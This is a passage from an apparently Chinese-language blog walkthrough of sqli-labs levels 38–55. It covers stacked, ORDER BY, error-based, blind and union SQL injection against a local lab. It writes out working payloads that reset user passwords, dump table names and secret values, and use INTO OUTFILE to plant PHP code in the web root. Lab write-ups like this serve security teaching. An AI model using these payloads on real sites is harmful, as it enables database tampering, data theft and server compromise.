class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="Stacked"><a href="#Stacked" class="headerlink" title="Stacked"></a>Stacked</h2><h3 id="level-38"><a href="#level-38" class="headerlink" title="level-38"></a>level-38</h3><p><strong>GET-单引号-简单堆叠注入</strong><br>堆叠注入，即query1;query2;query……;  这样多个sql语句放在一起注入<br>这次level更改了sql查询API，mysqli_multi_query，看看它和mysql_query的区别，可以看到mysqli_multi_query可以一次使用多个语句，也就为堆叠注入创造了条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(query,connection)</span><br><span class="line">query必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</span><br><span class="line">connection可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(connection,query);</span><br><span class="line">connection必需。规定要使用的 MySQL 连接。</span><br><span class="line">query必需。规定一个或多个查询，用分号进行分隔。</span><br></pre></td></tr></table></figure><p>所以我们就可以任意利用后面这句话，以更改密码为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改数据</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">38</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;;update users set password =&#x27;</span><span class="number">1234</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;%23</span></span><br><span class="line"><span class="string">写入文件</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-38/?id=1&#x27;</span>;select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-38\\test.php&quot;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>成功修改Dumb密码</p><p><img src="/2022/02/17/sqli-labs/2022-02-24-12-48-01.png"></p><p>成功写入后台文件   </p><p><img src="/2022/02/17/sqli-labs/2022-02-24-12-48-35.png"></p><h3 id="level-39"><a href="#level-39" class="headerlink" title="level-39"></a>level-39</h3><p><strong>GET-简单堆叠注入</strong></p><p>原理同level-38<br>仅展示更新Dumb密码，不细致展开   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">39</span>/?<span class="built_in">id</span>=<span class="number">1</span>; update users <span class="built_in">set</span> password= <span class="string">&#x27;234&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>;%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-40"><a href="#level-40" class="headerlink" title="level-40"></a>level-40</h3><p><strong>GET-盲注-字符型-简单堆叠注入</strong><br>原理和之前一样，不细致展开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-40/?id=1&#x27;);update users set password=&#x27;123&#x27; where username=&#x27;Dumb&#x27;%23 </span><br></pre></td></tr></table></figure><h3 id="level-41"><a href="#level-41" class="headerlink" title="level-41"></a>level-41</h3><p><strong>GET-盲注-整型-简单堆叠注入</strong><br>不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">41</span>/?<span class="built_in">id</span>=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;234&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>%<span class="number">23</span> </span><br></pre></td></tr></table></figure><h3 id="level-42"><a href="#level-42" class="headerlink" title="level-42"></a>level-42</h3><p><strong>POST-单引号-简单过滤-简单堆叠注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$con1</span>, <span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database ######: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure><p>可以看到username被过滤了，但是password没有被过滤，所以可以使用password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">login_user=a<span class="string">&#x27;&amp;login_password=a&#x27;</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;2345&#x27;</span> where username=<span class="string">&#x27;Dumb&#x27;</span>%<span class="number">23</span> &amp;mysubmit=Login   </span><br></pre></td></tr></table></figure><h3 id="level-43"><a href="#level-43" class="headerlink" title="level-43"></a>level-43</h3><p><strong>POST-单引号-单括号-简单过滤-简单堆叠注入</strong><br>与level-42原理相同，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a<span class="string">&#x27;); update users set password=&#x27;</span><span class="number">111</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23 &amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-44"><a href="#level-44" class="headerlink" title="level-44"></a>level-44</h3><p><strong>POST-单引号-盲注-简单过滤-简单堆叠注入</strong><br>与level-42原理相同，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=aa<span class="string">&#x27;; update users set password=&#x27;</span><span class="number">222</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-45"><a href="#level-45" class="headerlink" title="level-45"></a>level-45</h3><p><strong>POST-单引号-单括号-简单过滤-简单堆叠注入</strong><br>原理同上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=a&amp;login_password=a<span class="string">&#x27;); update users set password=&#x27;</span><span class="number">232</span><span class="string">&#x27; where username=&#x27;</span>Dum<span class="string">b&#x27;%23&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><h3 id="level-46"><a href="#level-46" class="headerlink" title="level-46"></a>level-46</h3><p><strong>ORDER BY-有报错回显-注入</strong><br>关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY $id&quot;</span>;</span><br></pre></td></tr></table></figure><p>因为ORDER BY 后面是需要一个数字，不同的数字返回值不一样，或者没有返回，所以他和我们注入点一样，相当于一个查询字段参数，所以之前的手法都可以用<br>1、报错注入，有报错回显可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>2、时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),null)</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),null)</span><br><span class="line">回显</span><br><span class="line">慢了三秒</span><br></pre></td></tr></table></figure><p>3、布尔注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">回显</span><br><span class="line">同order by <span class="number">1</span>,即sort=<span class="number">1</span>，因为length(database())=<span class="number">8</span> 值为真</span><br></pre></td></tr></table></figure><p>4、写入文件，需要对应参数打开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> (select database() ) into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> (select database() ) into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span>;</span><br><span class="line">回显</span><br><span class="line">成功写入</span><br></pre></td></tr></table></figure><p>phpinfo写入，利用<code> lines terminated by hex(payload)</code>,即用payload分隔每一行结果。例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">46</span>/?sort=<span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-46\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span>;</span><br><span class="line">后显</span><br><span class="line">在test.php里</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span>…………</span><br></pre></td></tr></table></figure><p>参考：<br>MYSQL 注入天书</p><h3 id="level-47"><a href="#level-47" class="headerlink" title="level-47"></a>level-47</h3><p><strong>ORDER BY-有报错回显-单引号-注入</strong><br>原理同level-46，不过加了单引号<br>1、报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-47/?sort=1&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY &#x27;1&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;&#x27;</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">47</span>/?sort=<span class="number">1</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020  %23</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users ORDER BY &#x27;</span><span class="number">1</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-47\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020 #&#x27;</span></span><br><span class="line">回显，test.php</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span></span><br></pre></td></tr></table></figure><p>剩下都一样，注意前后闭合即可，不详细展示了，</p><h3 id="level-48"><a href="#level-48" class="headerlink" title="level-48"></a>level-48</h3><p><strong>ORDER BY-无报错回显-盲注-注入</strong><br>1、布尔注入，时间盲注不展开，类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">48</span>/?sort=<span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">0</span> <span class="keyword">or</span> length(database())=<span class="number">8</span></span><br><span class="line">回显</span><br><span class="line">等同于order by <span class="number">1</span>,即sort=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>2、文件写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">48</span>/?sort=<span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-48\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span> </span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span> into outfile <span class="string">&quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-48\\test.php&quot;</span> lines terminated by <span class="number">0x3c3f70687020706870696e666f28293b3f3e2020</span></span><br><span class="line">回显 test.php</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">232</span>&lt;?php phpinfo();?&gt;  <span class="number">2</span>Angelina&lt;?php phpinfo();?&gt;  <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="level-49"><a href="#level-49" class="headerlink" title="level-49"></a>level-49</h3><p><strong>ORDER BY-无报错回显-单引号-盲注-注入</strong><br>原理类似level-48，闭合单引号即可，仅给出布尔注入，不展开了<br>1、布尔注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">49</span>/?sort=<span class="number">0</span><span class="string">&#x27; or length(database())=8 or &#x27;</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> length(database())=<span class="number">8</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">回显</span><br><span class="line">等同于order by <span class="number">1</span>，即sort=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-50"><a href="#level-50" class="headerlink" title="level-50"></a>level-50</h3><p><strong>ORDER BY-有报错回显-堆叠注入-注入</strong><br>1、报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-50/?sort=1 or updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY 1 or updatexml(1,concat(0x7e,(database()),0x7e),1)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: &#x27;~security~&#x27;</span><br></pre></td></tr></table></figure><p>2、堆叠注入，因为查询函数为mysqli_multi_query</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">50</span>/?sort=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;333&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;333&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">回显，成功修改</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">333</span></span><br></pre></td></tr></table></figure><p>3、文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-50/?sort=1;select 1,2,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-50\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY 1;select 1,2,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-50\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020</span><br><span class="line">回显，test.php</span><br><span class="line">123&lt;?php phpinfo();?&gt;  </span><br></pre></td></tr></table></figure><h3 id="level-51"><a href="#level-51" class="headerlink" title="level-51"></a>level-51</h3><p><strong>ORDER BY-有报错回显-单引号-堆叠注入-注入</strong><br>原理同level-50，只不过加了单引号，注意闭合即可，仅展示报错注入，其他不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">51</span>/?sort=<span class="number">1</span><span class="string">&#x27; or updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="level-52"><a href="#level-52" class="headerlink" title="level-52"></a>level-52</h3><p><strong>ORDER BY-无报错回显-堆叠注入-注入</strong><br>原理类似level-50，无报错回显,仅展示堆叠注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">52</span>/?sort=<span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;343&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users ORDER BY <span class="number">1</span>;update users <span class="built_in">set</span> password=<span class="string">&#x27;343&#x27;</span> where username =<span class="string">&#x27;Dumb&#x27;</span>;</span><br><span class="line">回显，修改成功</span><br><span class="line"><span class="number">1</span>Dumb<span class="number">343</span></span><br></pre></td></tr></table></figure><h3 id="level-53"><a href="#level-53" class="headerlink" title="level-53"></a>level-53</h3><p><strong>ORDER BY-无报错回显-单引号-堆叠注入-注入</strong><br>原理同level-52，注意单引号闭合即可，仅展示堆叠注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">53</span>/?sort=<span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">443</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users ORDER BY &#x27;</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">443</span><span class="string">&#x27; where username =&#x27;</span>Dum<span class="string">b&#x27;;&#x27;</span></span><br><span class="line">回显，修改成功 </span><br><span class="line"><span class="number">1</span>Dumb<span class="number">443</span></span><br></pre></td></tr></table></figure><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>challenges是贴近实战的测试，主要限制了试错次数。</p><h3 id="level-54"><a href="#level-54" class="headerlink" title="level-54"></a>level-54</h3><p>用单引号加注释测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">返回正确，说明后台只是加了单引号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">继续爆字段，直接猜测为3个，不行就4个，不用order by，浪费次数，以及这样可以直接出利用位置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-54/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span> Your Password:<span class="number">3</span></span><br><span class="line"></span><br><span class="line">利用位置<span class="number">3</span>，爆表</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:u3s457bfxv</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-54/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;u3s457bfxv&#x27;</span>%<span class="number">23</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="built_in">id</span>,sessid,secret_I2EY,tryy</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">GAT DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">54</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,secret_I2EY from u3s457bfxv%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">DUAj72iD5Abea04ua8qIXd7g</span></span><br><span class="line"><span class="string">提交之后成功</span></span><br></pre></td></tr></table></figure><h3 id="level-55"><a href="#level-55" class="headerlink" title="level-55"></a>level-55</h3><p>使用单引号加注释测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">55</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;%23 无回显</span></span><br><span class="line"><span class="string">测试了6次得到。。。。。</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=1) %23</span></span><br><span class="line"><span class="string">直接猜字段为3</span></span><br><span class="line"><span class="string">GET DATA </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-55/?id=-1)  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Your Login name:2 Your Password:g1e3zfujs5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆字段</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span 